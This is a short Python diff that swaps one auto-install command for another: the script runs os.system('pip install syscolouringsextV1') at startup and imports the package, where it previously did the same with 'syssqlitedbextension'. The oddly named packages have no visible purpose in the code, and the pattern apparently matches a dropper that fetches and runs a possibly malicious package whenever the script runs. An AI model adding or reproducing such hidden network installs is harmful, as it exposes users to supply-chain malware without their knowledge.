@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlitedbextension")
-import syssqlitedbextension
+os.system("pip install syscolouringsextV1")
+import syscolouringsextV1
 import random
 import requests
 import time
